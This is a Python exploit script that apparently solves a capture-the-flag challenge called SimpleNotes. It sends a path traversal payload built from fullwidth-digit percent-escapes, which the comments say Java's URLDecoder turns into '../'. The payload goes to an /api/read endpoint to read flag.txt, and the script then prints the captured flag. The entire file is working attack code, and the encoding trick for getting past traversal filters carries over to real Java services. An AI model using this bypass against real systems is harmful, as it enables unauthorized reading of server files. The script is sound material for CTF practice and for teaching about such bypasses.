#!/usr/bin/env python3
"""Exploit the Unicode hexadecimal escape bypass in SimpleNotes."""

import argparse
import re
import urllib.parse
import urllib.request


FLAG_RE = re.compile(r"THJCC\{[^\r\n}]*\}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "url",
        nargs="?",
        default="http://chal.thjcc.org:12024",
        help="challenge base URL",
    )
    args = parser.parse_args()

    # Java URLDecoder accepts these fullwidth characters as hexadecimal digits:
    #   %２Ｅ -> .
    #   %２Ｆ -> /
    # Two parent-directory segments escape the notes directory and reach /.
    segment = "%２Ｅ%２Ｅ%２Ｆ"
    payload = segment * 2 + "flag.txt"
    query = urllib.parse.urlencode({"f": payload})
    target = f"{args.url.rstrip('/')}/api/read?{query}"

    with urllib.request.urlopen(target, timeout=15) as response:
        body = response.read().decode("utf-8", errors="replace")

    match = FLAG_RE.search(body)
    if not match:
        raise SystemExit(f"[-] flag not found in response: {body!r}")

    print(f"[+] payload: {payload}")
    print(f"[+] flag: {match.group(0)}")


if __name__ == "__main__":
    main()
